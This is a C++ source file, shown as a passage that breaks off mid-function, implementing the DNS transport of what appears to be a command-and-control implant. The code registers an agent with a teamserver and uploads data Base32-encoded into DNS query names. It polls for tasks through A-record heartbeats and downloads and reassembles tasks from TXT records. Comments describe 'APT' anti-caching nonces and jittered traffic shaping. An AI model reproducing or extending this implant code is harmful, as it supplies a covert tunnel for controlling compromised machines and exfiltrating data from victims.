#include "ConnectorDNS.h"
#include "DnsUtils.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"
#include "DnsCompression.h"

extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);

// ============================================================================
// Helper: Select resolver from profile (first entry before comma/semicolon)
// ============================================================================

static void SelectResolver(const CHAR* raw, CHAR* out, size_t outSize)
{
	const CHAR* def = "1.1.1.1";
	if (!raw || !raw[0]) {
		_snprintf(out, outSize, "%s", def);
		return;
	}

	size_t i = 0;
	while (raw[i] && i + 1 < outSize) {
		CHAR c = raw[i];
		if (c == ',' || c == ';' || c == ' ' || c == '\t' || c == '\r' || c == '\n')
			break;
		out[i] = c;
		++i;
	}
	out[i] = '\0';
	if (i == 0) {
		_snprintf(out, outSize, "%s", def);
	}
}

static ULONG DnsBuildWireSeq(ULONG logicalSeq, ULONG signalBits)
{
	ULONG seqCounter = logicalSeq & 0x0FFF;
	ULONG sig = signalBits & 0x0F;
	return (sig << 12) | seqCounter;
}

// High 4 bits of seq are used as signalBits. For DNS connector we set a
// constant non-zero marker so the server can distinguish logical DNS vs DoH
// traffic at protocol level.
static const ULONG kDnsSignalBitsDNS = 0x1;

#pragma pack(push, 1)
typedef struct _DNS_META_V1 {
	BYTE  version;
	BYTE  metaFlags;
	USHORT reserved;
	ULONG queryTaskId;
} DNS_META_V1, *PDNS_META_V1;
#pragma pack(pop)

static void MetaV1Init(DNS_META_V1* h)
{
	if (!h) return;
	h->version     = 1;
	h->metaFlags   = 0;
	h->reserved    = 0;
	h->queryTaskId = 0;
}

static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;
	if (!ApiWin || !ApiWin->WSAStartup || !ApiWin->socket || !ApiWin->sendto || !ApiWin->recvfrom || !ApiWin->closesocket)
		return FALSE;

	WSADATA wsaData;
	if (ApiWin->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return FALSE;

	SOCKET s = ApiWin->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == INVALID_SOCKET) {
		ApiWin->WSACleanup();
		return FALSE;
	}

	// 解析 resolver，支持从 profile.resolvers 传入的 IPv4 文本，
	// 若为空则回退到默认 1.1.1.1。
	CHAR resolver[64];
	memset(resolver, 0, sizeof(resolver));
	SelectResolver(resolverRaw, resolver, sizeof(resolver));

	HOSTENT* he = ApiWin->gethostbyname(resolver);
	if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(53);
	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

	BYTE query[4096];
	memset(query, 0, sizeof(query));
	USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
	query[0] = (BYTE)(id >> 8);
	query[1] = (BYTE)(id & 0xFF);
	query[2] = 0x01; // recursion desired
	query[3] = 0x00;
	query[4] = 0x00;
	query[5] = 0x01; // QDCOUNT = 1

	int offset = 12;
	int nameLen = DnsEncodeName(qname, query + offset, sizeof(query) - offset - 4);
	if (nameLen < 0) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}
	offset += nameLen;
	// QTYPE / QCLASS IN (1)
	USHORT qtypeCode = 16; // TXT
	if (qtypeStr && qtypeStr[0]) {
		CHAR qt[8];
		memset(qt, 0, sizeof(qt));
		int qi = 0;
		while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
			CHAR c = qtypeStr[qi];
			if (c >= 'a' && c <= 'z')
				c = (CHAR)(c - 'a' + 'A');
			qt[qi++] = c;
		}
		qt[qi] = '\0';
		// Only support TXT/A/AAAA here.
		if (qt[0] == 'A' && qt[1] == '\0') {
			qtypeCode = 1; // A
		} else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0') {
			qtypeCode = 28; // AAAA
		}
	}
	query[offset++] = (BYTE)(qtypeCode >> 8);
	query[offset++] = (BYTE)(qtypeCode & 0xFF);
	query[offset++] = 0x00;
	query[offset++] = 0x01;

	BYTE resp[1024];
	memset(resp, 0, sizeof(resp));
	int recvLen = 0;
	const int maxRetries = 3;
	for (int attempt = 0; attempt < maxRetries; ++attempt) {
		int sent = ApiWin->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
		if (sent != offset) {
			ApiWin->closesocket(s);
			ApiWin->WSACleanup();
			return FALSE;
		}

		fd_set readfds;
		readfds.fd_count = 1;
		readfds.fd_array[0] = s;
		timeval timeout;
		timeout.tv_sec = 2;
		timeout.tv_usec = 0;

		int selResult = ApiWin->select(0, &readfds, NULL, NULL, &timeout);
		if (selResult == 0) {
			// timeout, retry if attempts remain
			continue;
		}
		if (selResult == SOCKET_ERROR) {
			break;
		}

		int addrLen = sizeof(addr);
		recvLen = ApiWin->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
		if (recvLen > 0)
			break;
	}

	ApiWin->closesocket(s);
	ApiWin->WSACleanup();
	if (recvLen <= 0)
		return FALSE;

	// 解析 answers，根据 qtypeCode 决定如何重组 payload
	if (recvLen < 12)
		return FALSE;
	int qdcount = (resp[4] << 8) | resp[5];
	int ancount = (resp[6] << 8) | resp[7];
	int pos = 12;
	// 跳过所有 question
	for (int qi = 0; qi < qdcount; ++qi) {
		// 跳过 name
		while (pos < recvLen && resp[pos] != 0) {
			if ((resp[pos] & 0xC0) == 0xC0) { // 压缩指针
				pos += 2;
				break;
			}
			pos += resp[pos] + 1;
		}
		pos++; // 终止 0
		pos += 4; // QTYPE+QCLASS
	}

	ULONG written = 0;
	// 解析 answers
	for (int ai = 0; ai < ancount; ++ai) {
		if (pos + 12 > recvLen)
			return FALSE;
		// name（可能是压缩指针）
		if ((resp[pos] & 0xC0) == 0xC0)
			pos += 2;
		else {
			while (pos < recvLen && resp[pos] != 0) {
				pos += resp[pos] + 1;
			}
			pos++;
		}
		USHORT type = (resp[pos] << 8) | resp[pos + 1];
		pos += 2; // TYPE
		pos += 2; // CLASS
		pos += 4; // TTL
		USHORT rdlen = (resp[pos] << 8) | resp[pos + 1];
		pos += 2;
		if (pos + rdlen > recvLen)
			return FALSE;

		if (qtypeCode == 16 && type == 16 && rdlen > 0) {
			// TXT RDATA: one or more <len><data> segments; concatenate safely
			USHORT consumed = 0;
			ULONG txtWritten = 0;
			while (consumed < rdlen) {
				if (pos + consumed >= recvLen)
					break;
				BYTE txtLen = resp[pos + consumed];
				consumed++;
				if (consumed + txtLen > rdlen)
					break;
				if (txtLen > 0) {
					if (txtWritten + txtLen <= outBufSize) {
						memcpy(outBuf + txtWritten, resp + pos + consumed, txtLen);
						txtWritten += txtLen;
					} else {
						// output buffer full
						break;
					}
				}
				consumed += txtLen;
			}
			if (txtWritten > 0) {
				*outSize = txtWritten;
				return TRUE;
			}
		} else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
			// A 记录：4 字节 IPv4，服务器端按 4 字节分片 payload
			if (written + 4 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 4);
				written += 4;
			}
		} else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
			// AAAA 记录：16 字节 IPv6，服务器端按 16 字节分片 payload
			if (written + 16 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 16);
				written += 16;
			}
		}
		pos += rdlen;
	}

	if (qtypeCode == 1 || qtypeCode == 28) {
		if (written > 0) {
			*outSize = written;
			return TRUE;
		}
	}

	return FALSE;
}

// DnsBuildDataLabels and Base64Decode are now in DnsUtils.h/cpp

ConnectorDNS::ConnectorDNS()
{
	DnsDebugLog("[DNS] ConnectorDNS::ctor");
}

BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
{
    // cache profile
    this->profile = profile;

    // copy encrypt key (expect up to 16 bytes)
    if (!profile.encrypt_key)
        return FALSE;
    memset(this->encryptKey, 0, sizeof(this->encryptKey));
    ULONG keyLen = StrLenA((CHAR*)profile.encrypt_key);
    if (keyLen > 16)
        keyLen = 16;
    memcpy(this->encryptKey, profile.encrypt_key, keyLen);

    // pkt size and basic bounds
    this->pktSize = profile.pkt_size ? profile.pkt_size : 1024;
    if (this->pktSize > 64000)
        this->pktSize = 64000;

    // label size (per DNS label, in Base32 characters)
    this->labelSize = profile.label_size ? profile.label_size : 48;
    if (this->labelSize == 0 || this->labelSize > 63)
        this->labelSize = 48;

    // domain/qtype
    if (profile.domain)
        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    // Force TXT mode internally to support the Hybrid A/TXT protocol.
    // Even if the user configures "A" in the listener profile, we override it here
    // because the new protocol logic relies on TXT for data transport.
    lstrcpynA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));

    // derive sid from decrypted beat first 8 bytes (agent_type, agent_id)
    if (!beat || !beatSize || beatSize < 8)
        return FALSE;

    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy)
        return FALSE;
    memcpy(beatCopy, beat, beatSize);

    // beat is already RC4-encrypted with config->encrypt_key on Agent side,
    // so here we decrypt it with the same key to get clear agent_id.
    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    // Interpret agent_id in big-endian order to match the HTTP listener /
    // Go side (which uses binary.BigEndian.Uint32). This ensures that the
    // sid we derive here is identical to the agentId string used by the
    // teamserver, so TsAgentProcessData/TsAgentGetHostedTasks(sid, ...) hit
    // the same agent entry.
    ULONG agentId = 0;
    if (beatSize >= 8) {
        agentId |= ((ULONG)beatCopy[4] << 24);
        agentId |= ((ULONG)beatCopy[5] << 16);
        agentId |= ((ULONG)beatCopy[6] << 8);
        agentId |= ((ULONG)beatCopy[7] << 0);
    }
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    // cache initial beat for potential smart HI retries
    if (beat && beatSize) {
        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
        if (this->hiBeat) {
            memcpy(this->hiBeat, beat, beatSize);
            this->hiBeatSize = beatSize;
            this->hiRetries  = 3;
            this->hiSent     = FALSE;
        }
    }

    this->initialized = TRUE;
    DnsDebugLogf("[DNS] SetConfig OK: sid=%s domain=%s pktSize=%lu labelSize=%lu", 
                 this->sid, this->domain, this->pktSize, this->labelSize);
    return TRUE;
}

void ConnectorDNS::CloseConnector()
{
    // Free any allocated receive buffer.
    if (this->recvData) {
        // Using HeapFree / LocalFree would require function pointers
        // similar to other connectors; for this stub we simply ignore
        // allocator details and reset the pointer/state.
        this->recvData = NULL;
        this->recvSize = 0;
    }
    if (this->hiBeat && this->hiBeatSize) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
        this->hiBeatSize = 0;
    }
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf    = NULL;
        this->downTotal  = 0;
        this->downFilled = 0;
    }
}

void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
{
	this->profile.resolvers = resolvers;
}

void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
{
    // base packet size used for DNS frames
    ULONG pkt = this->pktSize ? this->pktSize : 1024;
    if (pkt > 64000)
        pkt = 64000;

    CHAR dataLabel[1024];
    memset(dataLabel, 0, sizeof(dataLabel));
    CHAR qname[512];
    memset(qname, 0, sizeof(qname));

    // HI：第一次带 beat 的调用仍然沿用原始打包方式
    if (!this->hiSent && data && data_size) {
        DnsDebugLogf("[DNS] [UP] HI beat size=%lu", data_size);
        // Base32 encoding expands data by ~1.6x. The total DNS QNAME length is limited to 253 bytes.
        // Subtracting domain and prefix overhead, we have about 150-180 chars for data labels.
        // 180 chars Base32 -> ~110 bytes raw data.
        // We set a conservative limit of 60 bytes to leave ample room for the user's domain.
        // 60 bytes raw -> 96 chars Base32.
        // 96 + 31 (prefix) = 127 chars used.
        // 253 - 127 = 126 chars remaining for the Domain. This is very safe.
        const ULONG maxSafeFrame = 60;
        ULONG maxBuf = pkt;
        if (maxBuf > maxSafeFrame)
            maxBuf = maxSafeFrame;
        if (data_size && maxBuf > data_size)
            maxBuf = data_size;
        BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
        if (!encBuf)
            return;
        memcpy(encBuf, data, maxBuf);
        if (!DnsBuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, maxBuf);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, maxBuf);

        ULONG hiWireSeq = DnsBuildWireSeq(this->seq, kDnsSignalBitsDNS);
        DnsBuildQName(this->sid, "www", hiWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        this->lastQueryOk = DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
        if (this->lastQueryOk) {
            this->hiSent = TRUE;
            DnsDebugLog("[DNS] HI: SUCCESS - agent registered");
        } else {
            if (this->hiRetries > 0) {
                this->hiRetries--;
            }
            DnsDebugLogf("[DNS] HI: FAILED, retries left=%lu", this->hiRetries);
        }
        return;
    }

    // 之后所有有数据的调用视为 PUT，使用应用层分片：
    // frame = [META_V1:8][4 bytes total_len][4 bytes offset][chunk...]
    if (data && data_size) {
        DnsDebugLogf("[DNS] [UP] PUT total=%lu bytes", data_size);
        const ULONG metaSize = sizeof(DNS_META_V1);
        const ULONG headerSize = metaSize + 8; // meta + [total][offset]
        ULONG total = data_size;
        ULONG maxChunk = pkt;
        if (maxChunk <= headerSize)
            maxChunk = headerSize + 1;
        maxChunk -= headerSize;

        // CRITICAL FIX: Enforce 253-byte QNAME limit.
        // 60 bytes raw -> 96 chars Base32.
        // 96 + 50 (domain/overhead) = 146 < 253. Very Safe.
        const ULONG maxSafeFrame = 60;
        if (maxChunk + headerSize > maxSafeFrame)
            maxChunk = maxSafeFrame - headerSize;

        // 安全上限，避免异常情况占用过多内存；与服务器侧 handlePutFragment 对齐。
        const ULONG maxUploadSize = 4 << 20; // 4MB
        if (total > maxUploadSize)
            total = maxUploadSize;

        ULONG seqForSend = ++this->seq;
        ULONG offset = 0;
        while (offset < total) {
            ULONG chunk = total - offset;
            if (chunk > maxChunk)
                chunk = maxChunk;

            ULONG frameSize = headerSize + chunk;
            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
            if (!frame)
                return;

            DNS_META_V1 meta;
            MetaV1Init(&meta);
            memcpy(frame, &meta, metaSize);
            // total_len (big-endian) after MetaHeader
            frame[metaSize + 0] = (BYTE)((total >> 24) & 0xFF);
            frame[metaSize + 1] = (BYTE)((total >> 16) & 0xFF);
            frame[metaSize + 2] = (BYTE)((total >> 8) & 0xFF);
            frame[metaSize + 3] = (BYTE)((total >> 0) & 0xFF);
            // offset (big-endian)
            frame[metaSize + 4] = (BYTE)((offset >> 24) & 0xFF);
            frame[metaSize + 5] = (BYTE)((offset >> 16) & 0xFF);
            frame[metaSize + 6] = (BYTE)((offset >> 8) & 0xFF);
            frame[metaSize + 7] = (BYTE)((offset >> 0) & 0xFF);
            memcpy(frame + headerSize, data + offset, chunk);

            memset(dataLabel, 0, sizeof(dataLabel));
            if (!DnsBuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                MemFreeLocal((LPVOID*)&frame, frameSize);
                return;
            }
            MemFreeLocal((LPVOID*)&frame, frameSize);

            ULONG putWireSeq = DnsBuildWireSeq(seqForSend, kDnsSignalBitsDNS);
            DnsBuildQName(this->sid, "cdn", putWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
            BYTE tmp[512];
            ULONG tmpSize = 0;
            
            // PUT with retry: DNS is unreliable, retry up to 3 times on failure
            BOOL putOk = FALSE;
            for (int retry = 0; retry < 3 && !putOk; retry++) {
                if (retry > 0) {
                    DnsDebugLogf("[DNS] [UP] PUT retry=%d off=%lu", retry, offset);
                    ApiWin->Sleep(100 + (GetTickCount() % 50));  // Backoff before retry
                }
                putOk = DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
            }
            
            if (!putOk) {
                DnsDebugLogf("[DNS] [UP] PUT failed off=%lu retries=3 abort", offset);
                return;  // Abort upload, will retry entire upload next time
            }

            // Pacing with Jitter (Traffic Shaping):
            // Range: 30-50ms (~20-30 packets/sec).
            // Public DoH resolvers can handle this rate.
            ULONG pacing = 30 + (GetTickCount() % 20);
            ApiWin->Sleep(pacing);

            offset += chunk;
        }
        // 记录本次上行总量，供自适应 sleep 使用
        this->lastUpTotal = total;
        DnsDebugLogf("[DNS] [UP] PUT done total=%lu", total);
        
        // After PUT, send ACK heartbeat with nonce to confirm task was received
        if (this->downAckOffset > 0) {
            ULONG ackNonce = GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
            BYTE ackData[8];
            ackData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
            ackData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
            ackData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
            ackData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
            ackData[4] = (BYTE)((ackNonce >> 24) & 0xFF);
            ackData[5] = (BYTE)((ackNonce >> 16) & 0xFF);
            ackData[6] = (BYTE)((ackNonce >> 8) & 0xFF);
            ackData[7] = (BYTE)((ackNonce >> 0) & 0xFF);
            CHAR ackLabel[24];
            memset(ackLabel, 0, sizeof(ackLabel));
            DnsBase32Encode(ackData, 8, ackLabel, sizeof(ackLabel));
            
            CHAR ackQname[256];
            DnsBuildQName(this->sid, "hb", ++this->seq, this->idx, ackLabel, this->domain, ackQname, sizeof(ackQname));
            BYTE tmp[16];
            ULONG tmpSize = 0;
            DnsQueryTxt(ackQname, (CHAR*)this->profile.resolvers, "A", tmp, sizeof(tmp), &tmpSize);
            DnsDebugLogf("[DNS] [UP] ACK sid=%s ack=%lu nonce=%08x", this->sid, this->downAckOffset, ackNonce);
            this->downAckOffset = 0;
        }
        return;
    }

    // 空数据：GET 下行任务；在未完成首 HI 时优先执行智能 HI 重试。
    if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
        ULONG maxBuf = pkt;
        // 智能上线：在未成功发送 HI 且仍有重试次数时，优先重发 HI
        ULONG retrySize = this->hiBeatSize;
        if (retrySize > maxBuf)
            retrySize = maxBuf;
        BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
        if (!encBuf)
            return;
        memcpy(encBuf, this->hiBeat, retrySize);
        if (!DnsBuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, retrySize);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, retrySize);

        ULONG hiRetryWireSeq = DnsBuildWireSeq(this->seq, kDnsSignalBitsDNS);
        DnsBuildQName(this->sid, "www", hiRetryWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
            this->hiSent = TRUE;
            this->lastQueryOk = TRUE;
        } else {
            this->lastQueryOk = FALSE;
            if (this->hiRetries > 0)
                this->hiRetries--;
        }
        return;
    }

    // 正常 GET / 心跳逻辑
    // Hybrid Mode (A/TXT):
    // 如果当前没有正在重组的下行任务 (downBuf == NULL) 且配置为 TXT 模式，
    // 则先发送一个轻量级的 A 记录查询作为心跳。
    // - 如果 TS 返回 0.0.0.0 -> 无任务，直接返回（进入 Sleep）。
    // - 如果 TS 返回 非 0.0.0.0 -> 有任务，继续执行下面的 TXT 查询拉取数据。
    // ACK 机制：在心跳 A 查询中携带 downAckOffset，告知服务器已确认接收的 offset。
    if (!this->downBuf && this->qtype[0] == 'T') { // starts with 'T' -> TXT
        CHAR qnameA[512];
        // APT: Include ack_offset AND nonce to prevent caching
        ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
        BYTE hbData[8];
        hbData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
        hbData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
        hbData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
        hbData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
        hbData[4] = (BYTE)((hbNonce >> 24) & 0xFF);
        hbData[5] = (BYTE)((hbNonce >> 16) & 0xFF);
        hbData[6] = (BYTE)((hbNonce >> 8) & 0xFF);
        hbData[7] = (BYTE)((hbNonce >> 0) & 0xFF);
        CHAR hbLabel[24];
        memset(hbLabel, 0, sizeof(hbLabel));
        DnsBase32Encode(hbData, 8, hbLabel, sizeof(hbLabel));
        ULONG hbLogicalSeq = this->seq + 1;
        ULONG hbWireSeq = DnsBuildWireSeq(hbLogicalSeq, kDnsSignalBitsDNS);
        DnsBuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
        
        DnsDebugLogf("[DNS] [HB-REQ] sid=%s seq=%lu ack=%lu nonce=%08x", this->sid, this->seq + 1, this->downAckOffset, hbNonce);
        
        BYTE ipBuf[16];
        ULONG ipSize = 0;
        // 查询 A 记录
        if (DnsQueryTxt(qnameA, (CHAR*)this->profile.resolvers, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
            this->lastQueryOk = TRUE;
            // 检查是否为 0.0.0.0
            if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
                // 无任务，更新 seq 并返回，让 MainAgent 继续 sleep
                this->seq++;
                DnsDebugLog("[DNS] [HB-RSP] no_tasks ip=0.0.0.0");
                // 重置 ACK offset 因为没有待下载的任务
                this->downAckOffset = 0;
                this->hasPendingTasks = FALSE;
                return;
            }
            // 有任务，标记 pending 以触发 burst 模式
            this->hasPendingTasks = TRUE;
            DnsDebugLogf("[DNS] [HB-RSP] has_tasks ip=%u.%u.%u.%u", 
                         ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
        } else {
            // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
            this->lastQueryOk = FALSE;
            DnsDebugLog("[DNS] [HB-RSP] A_query_failed");
            return;
        }
    }

    // 正常 GET (TXT)：从服务器获取包含 [total_len][offset][chunk] 头部的下行片段，
    // 在本地 downBuf 中重组，完整后再一次性交给 AgentMain。
    // APT DESIGN: Include both offset AND nonce in query to prevent ALL DNS caching
    // Nonce makes each query globally unique, offset tells server what data we need
    ULONG reqOffset = this->downFilled;
    ULONG nonce = GetTickCount() ^ (this->seq << 16) ^ (reqOffset * 31337);
    
    // Pack: [offset:4][nonce:4] -> Base32 label
    BYTE reqData[8];
    reqData[0] = (BYTE)((reqOffset >> 24) & 0xFF);
    reqData[1] = (BYTE)((reqOffset >> 16) & 0xFF);
    reqData[2] = (BYTE)((reqOffset >> 8) & 0xFF);
    reqData[3] = (BYTE)((reqOffset >> 0) & 0xFF);
    reqData[4] = (BYTE)((nonce >> 24) & 0xFF);
    reqData[5] = (BYTE)((nonce >> 16) & 0xFF);
    reqData[6] = (BYTE)((nonce >> 8) & 0xFF);
    reqData[7] = (BYTE)((nonce >> 0) & 0xFF);
    CHAR reqLabel[24];
    memset(reqLabel, 0, sizeof(reqLabel));
    DnsBase32Encode(reqData, 8, reqLabel, sizeof(reqLabel));
    
    ULONG logicalSeq = ++this->seq;
    ULONG getWireSeq = DnsBuildWireSeq(logicalSeq, kDnsSignalBitsDNS);
    DnsBuildQName(this->sid, "api", getWireSeq, this->idx, reqLabel, this->domain, qname, sizeof(qname));
    DnsDebugLogf("[DNS] [DOWN-REQ] sid=%s seq=%lu off=%lu nonce=%08x", this->sid, logicalSeq, reqOffset, nonce);
    BYTE respBuf[1024];
    ULONG respSize = 0;
    if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
        this->lastQueryOk = TRUE;
        DnsDebugLogf("[DNS] [DOWN-RSP] sid=%s raw_len=%lu", this->sid, respSize);
        // Check for simple ACK "OK"
        if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
            DnsDebugLog("[DNS] GET: received OK ACK");
            return;
        }

        // Base64 Decode the response (Server sends Base64 to ensure binary safety over TXT)
        BYTE binBuf[1024];
        int binLen = DnsBase64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
        if (binLen <= 0) {
            DnsDebugLog("[DNS] [DOWN-RSP] b64_decode_failed_or_empty");
            // Server may have restarted and lost task state
            // Abort current download so next heartbeat can re-check for tasks
            if (this->downBuf) {
                DnsDebugLog("[DNS] GET: Aborting incomplete download due to empty response");
                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                this->downBuf = NULL;
                this->downTotal = 0;
                this->downFilled = 0;
                this->downAckOffset = 0;
            }
            return;
        }

        const ULONG headerSize = 8;
        // 新协议：带有 [total_len][offset] 头部
        if (binLen > headerSize) {
            ULONG total = 0;
            ULONG offset = 0;
            total |= ((ULONG)binBuf[0] << 24);
            total |= ((ULONG)binBuf[1] << 16);
            total |= ((ULONG)binBuf[2] << 8);
            total |= ((ULONG)binBuf[3] << 0);
            offset |= ((ULONG)binBuf[4] << 24);
            offset |= ((ULONG)binBuf[5] << 16);
            offset |= ((ULONG)binBuf[6] << 8);
            offset |= ((ULONG)binBuf[7] << 0);
            ULONG chunkLen = binLen - headerSize;
            DnsDebugLogf("[DNS] [DOWN-CHUNK] sid=%s total=%lu off=%lu len=%lu want=%lu", this->sid, total, offset, chunkLen, reqOffset);
            const ULONG maxDownloadSize = 4 << 20; // 4MB
            if (total > 0 && total <= maxDownloadSize && offset < total) {
                // NEW DESIGN: Verify received offset matches what we requested.
                // If mismatched (due to DNS caching), discard and will retry next round.
                if (offset != reqOffset) {
                    DnsDebugLogf("[DNS] [DOWN-CHUNK] offset_mismatch got=%lu want=%lu discard", offset, reqOffset);
                    return; // Discard, will retry with same reqOffset next time
                }
                
                // Initialize buffer if needed (starting a NEW task)
                if (!this->downBuf || this->downTotal != total) {
                    // CRITICAL: If total changed, this is a NEW task from server restart
                    // We must discard current chunk and restart from offset=0
                    if (this->downBuf && this->downTotal) {
                        DnsDebugLogf("[DNS] [DOWN-CHUNK] task_changed old_total=%lu new_total=%lu restart", 
                                     this->downTotal, total);
                        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                    }
                    this->downBuf = (BYTE*)MemAllocLocal(total);
                    if (!this->downBuf) {
                        this->downTotal  = 0;
                        this->downFilled = 0;
                        return;
                    }
                    this->downTotal  = total;
                    this->downFilled = 0;
                    this->downAckOffset = 0; // Reset ACK offset for NEW task
                    DnsDebugLogf("[DNS] [DOWN-ASM] new_task total=%lu", total);
                    
                    // If current chunk offset != 0, discard it and request from 0 next time
                    if (offset != 0) {
                        DnsDebugLogf("[DNS] [DOWN-CHUNK] nonzero_offset_on_new off=%lu discard_retry", offset);
                        return; // Next SendData() will request offset=0
                    }
                }

                // Copy chunk at the correct offset
                ULONG end = offset + chunkLen;
                if (end > total)
                    end = total;
                ULONG n = end - offset;
                memcpy(this->downBuf + offset, binBuf + headerSize, n);
                
                // Update progress: since we request sequentially, downFilled = offset + n
                this->downFilled = offset + n;
                this->downAckOffset = this->downFilled;
                DnsDebugLogf("[DNS] [DOWN-ASM] sid=%s filled=%lu total=%lu", 
                             this->sid, this->downFilled, this->downTotal);
                if (this->downFilled >= this->downTotal) {
                    DnsDebugLogf("[DNS] [DOWN-ASM] sid=%s complete total=%lu", this->sid, this->downTotal);
                    // 解析会话头：[flags][orig_len_le]，然后将原始 payload 交给上层。
                    BYTE* finalBuf   = this->downBuf;
                    ULONG finalSize  = this->downTotal;
                    if (this->downTotal > 5) {
                        BYTE  flags = this->downBuf[0];
                        ULONG orig  = 0;
                        orig |= (ULONG)this->downBuf[1];
                        orig |= ((ULONG)this->downBuf[2] << 8);
                        orig |= ((ULONG)this->downBuf[3] << 16);
                        orig |= ((ULONG)this->downBuf[4] << 24);

                        if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
                            // 压缩路径：使用 DEFLATE 解压下行 payload。
                            BYTE* outBuf = NULL;
                            if (DeflateDecompress(this->downBuf + 5, this->downTotal - 5, &outBuf, orig) && outBuf) {
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        } else if (flags == 0 && orig > 0 && orig <= this->downTotal - 5) {
                            // 无压缩：直接跳过 5 字节头部，仅将原始任务 payload 交给上层。
                            BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
                            if (outBuf) {
                                memcpy(outBuf, this->downBuf + 5, orig);
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        }
                    }

                    this->recvData = finalBuf;
                    this->recvSize = (int)finalSize;
                    // 记录本次下行总量，供自适应 sleep 使用
                    this->lastDownTotal = finalSize;
                    // Keep downAckOffset = downTotal so next heartbeat ACKs completion to server!
                    // Don't reset to 0 here - server needs to see ackOffset >= total.
                    // downAckOffset will be reset when a NEW task starts (new downBuf allocation).
